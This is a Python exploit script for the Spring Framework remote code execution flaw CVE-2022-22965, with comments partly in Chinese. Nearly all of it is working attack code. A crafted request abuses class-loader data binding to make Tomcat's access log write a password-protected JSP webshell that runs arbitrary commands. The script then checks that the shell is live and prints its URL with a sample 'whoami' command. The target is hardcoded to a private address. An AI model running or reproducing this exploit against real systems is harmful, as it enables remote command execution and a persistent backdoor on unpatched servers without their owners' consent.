#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Time       : 2023/4/13 16:02
# Author     : yunkong
# FileName   : cve_2022_22965_rce.py
# Description:
#
# Exploit Title: Spring Framework RCE via Data Binding on JDK 9+ (CVE-2022-22965)
# Version: Spring Framework < 5.3.18 ，Spring Framework < 5.2.20 及衍生版本
# CVE: CVE-2022-22965
import random
import string
import requests
import urllib3
from urllib.parse import urljoin, urlparse
import time

urllib3.disable_warnings()  # 忽略https证书告警


def get_random(lens: int):
    # 定义可选的字符集
    characters = string.ascii_lowercase + string.digits

    return ''.join(random.choice(characters) for i in range(lens))


def exploit(target_url):
    proxy = {
        "http": "127.0.0.1:8080",
        "https": "127.0.0.1:8080"
    }
    random_pwd = get_random(6)
    random_name = get_random(6)
    random_name2 = random.uniform(1, 3)

    payload = f"/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22{random_pwd}%22" \
              f".equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di" \
              f".getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream(" \
              f")%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(" \
              f"b))!%3D-1)%7B%20out.println(new%20String(" \
              f"b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline" \
              f".first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps" \
              f"/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=" \
              f"{random_name}&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" \
              f"{random_name2} "
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "suffix": "%>//",
        "c1": "Runtime",
        "c2": "<%",
        "DNT": "1",
    }

    try:
        requests.get(url=target_url + payload,
                     headers=headers,
                     # proxies=proxy,
                     timeout=15,
                     allow_redirects=False,
                     verify=False)
        print("[*] Wait for the upload to complete...")
        time.sleep(10)
        print("[*] Wait to verify that the webshell writes...")
        shellurl = urljoin(target_url, f'{random_name}{random_name2}.jsp')
        shellgo = requests.get(shellurl,
                               timeout=15,
                               # proxies=proxy,
                               allow_redirects=False,
                               stream=True,
                               verify=False)
        if shellgo.status_code == 200:
            print(f"[+] Exploit completion, webshell url: {shellurl}?pwd={random_pwd}&cmd=whoami")
            return True

        # Depending on the server, the shell url may be in tomcats root folder
        else:
            parsedurl = urlparse(shellurl)
            rooturl = parsedurl.scheme + "://" + parsedurl.netloc
            shellurlroot = urljoin(rooturl, f'{random_name}{random_name2}.jsp')
            shellgoroot = requests.get(shellurlroot,
                                       timeout=15,
                                       # proxies=proxy,
                                       allow_redirects=False,
                                       stream=True,
                                       verify=False)
            if shellgoroot.status_code == 200:
                print(f"[+] Exploit completion, webshell url: {shellurlroot}?pwd={random_pwd}&cmd=whoami")
                return True
            else:
                print(f"[-] Exploit failure.")
                return False

    except Exception:
        print(f"[*] Warning, Unable to access {target_url}.")
        return False


def vuln_exploit_start(target_url):
    exploit(target_url)


vuln_exploit_start("http://192.168.12.130:8080")
